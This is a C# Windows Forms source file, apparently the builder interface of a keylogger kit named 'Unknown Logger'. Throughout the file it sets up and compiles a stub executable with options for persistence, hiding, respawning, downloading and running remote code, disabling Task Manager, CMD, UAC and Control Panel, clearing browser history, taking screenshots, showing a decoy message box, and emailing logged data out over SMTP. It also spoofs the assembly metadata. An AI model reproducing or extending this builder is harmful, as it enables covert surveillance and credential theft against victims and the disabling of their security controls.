using System;
using System.Windows.Forms;
using UnknownLibrary.SMTP;
using UnknownLibrary.FakeMessageBox;
using UnknownLibrary.Stub;
using UnknownLibrary.StubSource;
using UnknownLibrary.Keylogger.Variables;

namespace Unknown_Logger.Forms
{
    public partial class KeyloggerForm : MetroFramework.Forms.MetroForm
    {
        string DefaultGoogleSMTPServer = "smtp.gmail.com", DefaultSubject = "Message from Unknown Keylogger", DefaultBody = "Hello there, if you received this email Unknown Logger is working correctly.", LessSecureAppsLink = "https://www.google.com/settings/security/lesssecureapps";

        private void TB_DownloadAndExecuteLink_TextChanged(object sender, EventArgs e)
        {
            if (TB_DownloadAndExecuteLink.Text != string.Empty)
            {
                CB_DownloadAndExecute.Checked = true;
            }
        }

        private void TB_SiteVisitorLink_TextChanged(object sender, EventArgs e)
        {
            if (TB_SiteVisitorLink.Text != string.Empty)
            {
                CB_SiteVisitor.Checked = true;
            } 
        }

        private void BTN_FakeMessageboxPreview_Click(object sender, EventArgs e)
        {
            FakeMessageBoxCreator.createMessageBox(CB_MessageboxOption.Text, TB_FakeMessageboxText.Text, TB_FakeMessageboxName.Text, CB_MessageboxIcon.Text);
        }

        private void BTN_Build_Click(object sender, EventArgs e)
        {
            #region AssemblyInformation
            string AssemblyInformation = "using System.Reflection;" +
                "using System.Runtime.InteropServices;" +
                "[assembly: AssemblyTitle(\"" + TB_AssemblyTitle.Text + "\")]" +
                "[assembly: AssemblyConfiguration(\"\")]" +
                "[assembly: AssemblyCompany(\"" + TB_AssemblyCompany.Text + "\")]" +
                "[assembly: AssemblyProduct(\"" + TB_AssemblyProduct.Text + "\")]" +
                "[assembly: AssemblyCopyright(\"" + TB_AssemblyCopyright.Text + "\")]" +
                "[assembly: AssemblyTrademark(\"" + TB_AssemblyTrademark.Text + "\")]" +
                "[assembly: AssemblyCulture(\"\")]" +
                "[assembly: ComVisible(false)]"; //+
             //   "[assembly: Guid(\"3bbcc486 - f825 - 446e-b188 - f1fe50d7c7b2\")]" +
              //  "[assembly: AssemblyVersion(\""+NUD_AssemblyVersionNumber1.Value + "." + NUD_AssemblyVersionNumber2.Value + "." + NUD_AssemblyVersionNumber3.Value + "." + NUD_AssemblyVersionNumber4.Value+"\")]" +
               // "[assembly: AssemblyFileVersion(\""+NUD_AssemblyFileVersionNumber1.Value + "." + NUD_AssemblyFileVersionNumber2.Value + "." + NUD_AssemblyFileVersionNumber3.Value + "." + NUD_AssemblyFileVersionNumber4.Value+"\")]";
            #endregion
            #region ApplicationSourceCode
            #endregion


            SourceCodeForm sourceCodeForm = new SourceCodeForm();
            sourceCodeForm.Show();
            Variables.Initialize(CB_AddToStartup.Checked, CB_Hide.Checked, CB_Respawner.Checked, CB_DownloadAndExecute.Checked, CB_SiteVisitor.Checked,
                CB_SilentSiteVisitor.Checked, CB_ClearChromeAndFirefoxHistory.Checked, CB_DisableTaskManager.Checked, CB_DisableCMD.Checked, 
                CB_DisableUAC.Checked, CB_DisableControlPanel.Checked, CB_LogScreenShot.Checked, CB_FakeMessageBox.Checked, TB_FakeMessageboxName.Text,
                TB_FakeMessageboxText.Text, CB_MessageboxOption.Text, CB_MessageboxIcon.Text, TB_EMailTo.Text, TB_EMailFrom.Text, TB_EMailPassword.Text, Convert.ToInt32(NUD_EMailSendingIntervals.Value * 60000));
            bool Success = InitializeStub.Generate(SourceCodeForm.StubSourceCodeString, TB_AssemblyTitle.Text + ".exe", AssemblyInformation,
                CB_AddToStartup.Checked, CB_Hide.Checked, CB_Respawner.Checked, CB_DownloadAndExecute.Checked, CB_SiteVisitor.Checked, CB_SilentSiteVisitor.Checked,
                CB_ClearChromeAndFirefoxHistory.Checked, CB_DisableTaskManager.Checked, CB_DisableCMD.Checked, CB_DisableUAC.Checked, CB_DisableControlPanel.Checked,
                CB_LogScreenShot.Checked, CB_FakeMessageBox.Checked, TB_FakeMessageboxName.Text, TB_FakeMessageboxText.Text, CB_MessageboxOption.Text, CB_MessageboxIcon.Text,
                TB_EMailTo.Text, TB_EMailFrom.Text, TB_EMailPassword.Text, Convert.ToInt32(NUD_EMailSendingIntervals.Value * 60000), TB_SMTPServer.Text, TB_SMTPPort.Text);
            if (Success)
            {
                UnknownLibrary.Unknown.CreateLog(LB_StubBuildLogs, TB_AssemblyTitle.Text + " has successfully compiled!", true);
            }
            else
            {
                UnknownLibrary.Unknown.CreateLog(LB_StubBuildLogs, TB_AssemblyTitle.Text + "  could not compile!", false);
            }
        }

        private void TB_EMailTo_TextChanged_1(object sender, EventArgs e)
        {
            TB_EMailFrom.Text = TB_EMailTo.Text;
        }

        private void TB_EMailTo_TextChanged(object sender, EventArgs e)
        {
            TB_EMailFrom.Text = TB_EMailTo.Text;
        }

        public KeyloggerForm()
        {
            InitializeComponent();
        }

        private void BTN_CheckMail_Click(object sender, EventArgs e)
        {
            try
            {
                SMTP.SendMail(TB_EMailFrom.Text, TB_EMailTo.Text, TB_SMTPServer.Text, TB_SMTPPort.Text, TB_EMailPassword.Text, DefaultSubject, DefaultBody);
                MessageBox.Show("Mail successfully sent, check your inbox", "Unknown Logger", MessageBoxButtons.OK, MessageBoxIcon.Information);
            } catch (Exception Ex)
            {
                if(TB_SMTPServer.Text == DefaultGoogleSMTPServer)
                {
                  DialogResult dialogResult =   MessageBox.Show("ERROR: Bad port or credentials or in order to receive emails using SMTP you have to enable 'less secure apps'. Do you want to launch https://www.google.com/settings/security/lesssecureapps?", "Unknown Logger", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
                    if(dialogResult == DialogResult.Yes)
                    {
                        System.Diagnostics.Process.Start(LessSecureAppsLink);
                    } else
                    {
                        MessageBox.Show("Choose a different E-Mail service please", "Unknown Logger", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                    }
                }
                else
                {
                    MessageBox.Show("Error: " + Ex, "Unknown Logger", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
            }
    }
}
